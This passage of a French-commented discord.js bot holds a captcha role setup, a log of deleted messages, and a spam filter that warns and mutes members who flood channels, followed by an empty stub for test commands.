  if (!roleObj) return
  member.addRole(roleObj)
  member.guild.channels.forEach(r => r.overwritePermissions(roleObj, {
      VIEW_CHANNEL: false,
      SEND_MESSAGES: false,
  }))
  setTimeout(() => {
    member.guild.channels.find('name', 'captcha').overwritePermissions(roleObj, {
        VIEW_CHANNEL: true,
        SEND_MESSAGES: false
    })
  }, 1000);
});
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
client.on('messageDelete', message => {
  const del = client.emojis.find(emoji => emoji.name === 'del1')
  if (message.author.bot) return;
  var args = message.content.trim().split(/ +/g); 
  var cmd = args[0].toLocaleLowerCase();
  if (message.delete) {
    if (!message.guild.channels.find('name', 'log-robot')) return;
    var Embeda = new Discord.RichEmbed()
    .setDescription(`${del}  **[Message Delete]** <:emoji_10:585185183381323785> `)
    .addField("L'auteur du message est : `" + message.author.username + '`', "Message supprimer :\n" + message.cleanContent)
    .setColor("#d8f2fc")
    .setTimestamp()
    .setFooter('Error', client.user.displayAvatarURL);
    message.guild.channels.find('name', 'log-robot').send(Embeda);
  };    
});
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
client.on('message', msg => {
  client.emit('checkMessage', msg);
})
var authors = [];
var warned = [];
var banned = [];
var messageLog = [];
const warnBuffer = 3; 
const maxBuffer = 7; 
const interval = 2000; 
const warningMessage = "S'il vous plaît arrêter de spam !";
const banMessage = "à été kick pour spam !!";
const maxDuplicatesWarning = 7;
const maxDuplicatesBan = 10;
const deleteMessagesAfterBanForPastDays = 7;
const exemptRoles = [];
const exemptUsers = [];
if(isNaN(warnBuffer)) throw new Error("warnBuffer must be a number.");
if(isNaN(maxBuffer)) throw new Error("maxBuffer must be a number.");
if(isNaN(interval)) throw new Error("interval must be a number.");
if(!isNaN(banMessage) || banMessage.length < 5) throw new Error("banMessage must be a string and have at least 5 charcters length.");
if(!isNaN(warningMessage) || warningMessage.length < 5) throw new Error("warningMessage must be a string and have at least 5 characters.");
if(isNaN(maxDuplicatesWarning)) throw new Error("maxDuplicatesWarning must be a number.")
if(isNaN(maxDuplicatesBan)) throw new Error("maxDuplicatesBan must be a number.");
if(isNaN(deleteMessagesAfterBanForPastDays)) throw new Error("deleteMessagesAfterBanForPastDays must be a number.");
if(exemptRoles.constructor !== Array) throw new Error("extemptRoles must be an array.");
if(exemptUsers.constructor !== Array) throw new Error("exemptUsers must be an array.");
client.on("checkMessage", async (message) => {
  if (message.author.bot || message.channel.type !== "text" || !message.member || !message.guild || !message.channel.guild || message.member.hasPermission('MANAGE_MESSAGES')) return;
  var role = message.guild.roles.find('name', 'mute-spam');
  if (!role) return;
 const warnUser = async (m, reply) => {
  warned.push(m.author.id);
  m.channel.send(`<@${m.author.id}>, ${reply}`);
 }
 const banUser = async (m, banMsg) => {
  for (var i = 0; i < messageLog.length; i++) {
      if (messageLog[i].author == m.author.id) {
        messageLog.splice(i);
      }
    }
    banned.push(m.author.id);
    let user = m.guild.members.get(m.author.id);
    if (user) {
      user.kick().then((member) => {
        m.channel.send(`<@!${m.author.id}>, ${banMsg}`);
        return true;
     }).catch(() => {
        m.channel.send(`Oops, seems like i don't have sufficient permissions to ban <@!${message.author.id}>!`);
        return false;
    });
  }
}
  if (message.member.roles.some(r => exemptRoles.includes(r.name)) || exemptUsers.includes(message.author.tag)) return;
  if (message.author.id !== client.user.id) {
    let currentTime = Math.floor(Date.now());
    authors.push({
      "time": currentTime,
      "author": message.author.id
    });
    messageLog.push({
      "message": message.content,
      "author": message.author.id
    });
    let msgMatch = 0;
    for (var i = 0; i < messageLog.length; i++) {
      if (messageLog[i].message == message.content && (messageLog[i].author == message.author.id) && (message.author.id !== client.user.id)) {
        msgMatch++;
      }
    }
    if (msgMatch == maxDuplicatesWarning && !warned.includes(message.author.id)) {
      warnUser(message, warningMessage);
    }
    var matched = 0;
    for (var i = 0; i < authors.length; i++) {
      if (authors[i].time > currentTime - interval) {
        matched++;
        if (matched == warnBuffer && !warned.includes(message.author.id)) {
          warnUser(message, warningMessage);
        } else if (matched == maxBuffer) {
          if (!banned.includes(message.author.id)) {
            //banUser(message, banMessage);
              message.channel.send(`<@${message.author.id}>, Vous avez été mute pour spam.`)
              message.guild.channels.filter(channel => channel.type === 'text').forEach(channel => {
                channel.overwritePermissions(role, {
                  SEND_MESSAGES: false,
                  ADD_REACTIONS : false
                });
              });
              message.member.addRole(role);
            }
        }
      } else if (authors[i].time < currentTime - interval) {
        authors.splice(i);
        warned.splice(warned.indexOf(authors[i]));
        banned.splice(warned.indexOf(authors[i]));
      }
      if (messageLog.length >= 200) {
        messageLog.shift();
      }
    }
  }
});
/**
 * Fin de la parti modéaration et administation.
 */




 
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//    Ici il y aura toutes les commandes en test.                                       ///////////////////////////////////////////////
//  -Si la commandes est là, c'est qu'elle ne fonctionne pas ou qu'elle fonctionne mal. ///////////////////////////////////////////////
//  -Ce sont sans doute les futurs commandes du bot.                                    ///////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

client.on('message', message => {
  //Emojis gif nécéssaire.
  const captcha = client.emojis.find(emoji => emoji.name === 'captcha'); //Gif loading.
  const valide = client.emojis.find(emoji => emoji.name === 'valide'); //Gif croix valide.
  const faux = client.emojis.find(emoji => emoji.name === 'faux'); //Gif croix invalide.
  const fleche = client.emojis.find(emoji => emoji.name === 'fleche'); //Gif fleche fusée.
  const load = client.emojis.find(emoji => emoji.name === 'load'); //Gif fusée volante.
  //Const message error :
  const perms = "<:refus:588464518368067584>, Vous n'avez pas le droit d'effectuer cette commande !";
  const manque = "<:emoji_2:585171438592458762>, Vous avez oublié des informations donc la commande ne peux être effectuer !";
  //////////////////////////////////////////////////////
  //Si le message provient d'un bot retourner au début.
  if (message.author.bot) return;
  //Si le message n'est pas dans une guild retourner au début.
  if (!message.guild) return;
  //Création du embed.
  const Embed = new Discord.RichEmbed()
    .setColor(color)
    .setTimestamp()
    .setFooter(message.author.username, message.author.displayAvatarURL);
  //Variable utile :
  var args = message.content.trim().split(/ +/g); 
  var cmd = args[0].toLocaleLowerCase();
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
});